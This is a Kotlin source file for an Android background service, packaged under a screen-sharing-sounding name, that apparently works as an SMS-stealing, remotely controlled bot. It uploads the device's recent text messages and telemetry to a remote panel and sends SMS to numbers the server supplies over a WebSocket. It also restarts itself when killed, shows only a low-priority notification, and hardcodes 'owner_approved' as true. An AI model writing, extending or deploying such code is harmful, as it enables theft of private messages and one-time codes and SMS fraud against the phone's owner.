package com.screenlink.remote

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class TpcService : Service() {

    companion object {
        const val API_BASE_URL = "https://panel.example.com"

        const val CHANNEL_ID = "tpc_core"
        const val NOTIF_ID = 4201
        const val ACTION_STATUS = "com.screenlink.remote.STATUS"
        const val ACTION_RECONNECT = "com.screenlink.remote.RECONNECT"

        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"

        private const val HEARTBEAT_SEC = 30L
        private const val OUTBOX_SEC = 20L
        private const val INBOX_SEC = 600L
        private const val RECONNECT_MAX_MS = 30_000L
        private const val INFLIGHT_TTL_MS = 90_000L

        @Volatile var socketConnected = false
        @Volatile var lastNumber = ""
        @Volatile var lastHeartbeatAt = 0L
        @Volatile var instance: TpcService? = null

        fun start(ctx: Context) {
            val i = Intent(ctx, TpcService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
            else ctx.startService(i)
        }

        fun reconnect(ctx: Context) {
            val i = Intent(ctx, TpcService::class.java).setAction(ACTION_RECONNECT)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
            else ctx.startService(i)
        }

        fun ack(ctx: Context, itemId: String, status: String, error: String = "") {
            if (itemId.isBlank()) return

            val rid = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_RID, null) ?: return

            Thread {
                ApiClient.post("/devices/outbox/$itemId/ack", JSONObject().apply {
                    put("registration_id", rid)
                    put("status", status)
                    put("error", error)
                })
            }.start()

            runCatching {
                instance?.ws?.send(JSONObject().apply {
                    put("type", "ack")
                    put("id", itemId)
                    put("status", status)
                    put("error", error)
                }.toString())
            }
        }
    }

    private val client: OkHttpClient by lazy {
        ApiClient.client().newBuilder()
            .pingInterval(20, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
    }

    private val io: ScheduledExecutorService = Executors.newScheduledThreadPool(4)
    private val main = Handler(Looper.getMainLooper())
    private val inFlight = ConcurrentHashMap<String, Long>()

    private var ws: WebSocket? = null
    private val running = AtomicBoolean(false)
    private var reconnectDelay = 1000L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafe()

        if (!running.getAndSet(true)) {
            io.execute { startLoops() }
        } else if (intent?.action == ACTION_RECONNECT) {
            io.execute { connectSocket() }
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restart = PendingIntent.getService(
            this, 1, Intent(this, TpcService::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val at = System.currentTimeMillis() + 1500
        runCatching { am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, restart) }
            .onFailure { runCatching { am.set(AlarmManager.RTC_WAKEUP, at, restart) } }
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running.set(false)
        runCatching { ws?.close(1000, "service stop") }
        runCatching { io.shutdownNow() }
        socketConnected = false
        if (instance === this) instance = null
        broadcastStatus()
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val ch = NotificationChannel(
            CHANNEL_ID, "TPC Core", NotificationManager.IMPORTANCE_LOW
        ).apply { setShowBadge(false) }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(ch)
    }

    private fun startForegroundSafe() {
        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service running")
            .setContentText("SMS relay active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIF_ID, n,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIF_ID, n)
            }
        } catch (e: Exception) {
            Log.w("TPC", "foreground fail: ${e.message}")
        }
    }

    private fun startLoops() {
        registerAndPush()
        connectSocket()

        io.scheduleWithFixedDelay({
            runCatching { heartbeat() }
        }, 5, HEARTBEAT_SEC, TimeUnit.SECONDS)

        io.scheduleWithFixedDelay({
            runCatching { pollOutbox() }
        }, 8, OUTBOX_SEC, TimeUnit.SECONDS)

        io.scheduleWithFixedDelay({
            runCatching { syncInbox() }
        }, 20, INBOX_SEC, TimeUnit.SECONDS)
    }

    private fun prefs(): SharedPreferences = getSharedPreferences(PREFS, MODE_PRIVATE)

    private fun rid(): String {
        val p = prefs()
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun deviceName(): String = "${Build.MANUFACTURER} ${Build.MODEL}".take(40)

    private fun registerAndPush() {
        val ok = ApiClient.post("/devices/register", JSONObject().apply {
            put("device_name", deviceName())
            put("platform", "android")
            put("registration_id", rid())
            put("owner_approved", true)
            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
        })
        if (!ok) Log.w("TPC", "register fail")
        lastHeartbeatAt = System.currentTimeMillis()
    }

    private fun heartbeat() {
        pruneInFlight()

        val code = ApiClient.postCode("/devices/heartbeat", JSONObject().apply {
            put("registration_id", rid())
            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
        })

        if (code == 404) registerAndPush()
        if (code !in 200..299 && !socketConnected) connectSocket()

        lastHeartbeatAt = System.currentTimeMillis()
        broadcastStatus()
    }

    private fun pushTelemetry() {
        ApiClient.post("/devices/telemetry", JSONObject().apply {
            put("registration_id", rid())
            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
        })
    }

    private fun pollOutbox() {
        val res = ApiClient.get("/devices/outbox?registration_id=${rid()}") ?: return
        val items = res.optJSONArray("items") ?: return
        for (i in 0 until items.length()) {
            val o = items.optJSONObject(i) ?: continue
            handleSmsSend(o.optString("id"), o.optString("to"), o.optString("body"))
        }
    }

    private fun syncInbox() {
        val items = SmsReader.recent(this, 100)
        if (items.length() == 0) return
        ApiClient.post("/devices/sms/sync", JSONObject().apply {
            put("registration_id", rid())
            put("messages", items)
        })
    }

    private fun connectSocket() {
        if (!running.get()) return
        runCatching { ws?.cancel() }

        val req = Request.Builder().url(ApiClient.wsUrl() + rid()).build()

        ws = client.newWebSocket(req, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                socketConnected = true
                reconnectDelay = 1000L
                broadcastStatus()

                io.execute {
                    runCatching { pollOutbox() }
                    runCatching {
                        webSocket.send(JSONObject().apply {
                            put("type", "telemetry")
                            put("data", Telemetry.collect(this@TpcService))
                        }.toString())
                    }
                }
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                runCatching { handleSocketMessage(webSocket, JSONObject(text)) }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                socketConnected = false
                broadcastStatus()
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                socketConnected = false
                broadcastStatus()
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!running.get()) return
        val delay = reconnectDelay
        reconnectDelay = (reconnectDelay * 2).coerceAtMost(RECONNECT_MAX_MS)
        main.postDelayed({ if (running.get() && !socketConnected) connectSocket() }, delay)
    }

    private fun handleSocketMessage(webSocket: WebSocket, msg: JSONObject) {
        when (msg.optString("type").lowercase()) {
            "ping", "heartbeat" -> webSocket.send(JSONObject().apply {
                put("type", "pong")
                put("ts", System.currentTimeMillis() / 1000)
            }.toString())

            "hello" -> {
                pushTelemetry()
                pollOutbox()
            }

            "sms_send" -> handleSmsSend(
                msg.optString("id"), msg.optString("to"), msg.optString("body")
            )

            "command" -> handleCommand(webSocket, msg.optString("action").lowercase())
        }
    }

    private fun handleCommand(webSocket: WebSocket, action: String) {
        when (action) {
            "fetch_number", "number", "sim_info", "refresh_telemetry" -> {
                val telemetry = Telemetry.collect(this)
                webSocket.send(JSONObject().apply {
                    put("type", "command_result")
                    put("action", action)
                    put("data", telemetry)
                }.toString())
                ApiClient.post("/devices/command/result", JSONObject().apply {
                    put("registration_id", rid())
                    put("action", action)
                    put("data", telemetry)
                })
            }

            "ping" -> webSocket.send(JSONObject().apply {
                put("type", "pong")
                put("ts", System.currentTimeMillis() / 1000)
            }.toString())

            "wake" -> {
                pushTelemetry()
                pollOutbox()
            }
        }
        broadcastStatus()
    }

    private fun pruneInFlight() {
        val now = System.currentTimeMillis()
        inFlight.entries.removeAll { now - it.value > INFLIGHT_TTL_MS }
    }

    private fun handleSmsSend(itemId: String, to: String, body: String) {
        if (itemId.isBlank() || body.isBlank()) return

        val now = System.currentTimeMillis()
        val prev = inFlight.putIfAbsent(itemId, now)
        if (prev != null && now - prev < INFLIGHT_TTL_MS) return

        var target = SimNumbers.normalize(to)
        if (target.isBlank()) target = SimNumbers.best(this)?.first ?: ""

        if (target.isBlank()) {
            ack(this, itemId, "failed", "no target number")
            return
        }

        val digits = target.trimStart('+')
        if (digits.length == 10) target = "+91$digits"

        try {
            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subId = SimNumbers.all(this).firstOrNull()?.subId ?: -1
                if (subId >= 0) android.telephony.SmsManager.getSmsManagerForSubscriptionId(subId)
                else android.telephony.SmsManager.getDefault()
            } else {
                android.telephony.SmsManager.getDefault()
            }

            val parts = sm.divideMessage(body)
            val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT

            val sentList = ArrayList<PendingIntent>()
            parts.indices.forEach { idx ->
                sentList.add(PendingIntent.getBroadcast(
                    this, (itemId + idx).hashCode(),
                    Intent(this, SmsStatusReceiver::class.java).apply {
                        action = SmsStatusReceiver.ACTION_SENT
                        putExtra("item_id", itemId)
                        putExtra("to", target)
                        putExtra("body", body)
                    }, flags
                ))
            }

            if (parts.size > 1) sm.sendMultipartTextMessage(target, null, parts, sentList, null)
            else sm.sendTextMessage(target, null, body, sentList[0], null)

            Log.i("TPC", "SMS → $target")
        } catch (e: Exception) {
            inFlight.remove(itemId)
            ack(this, itemId, "failed", e.message ?: "send error")
        }
    }

    private fun broadcastStatus() {
        runCatching {
            sendBroadcast(Intent(ACTION_STATUS).setPackage(packageName))
        }
    }
}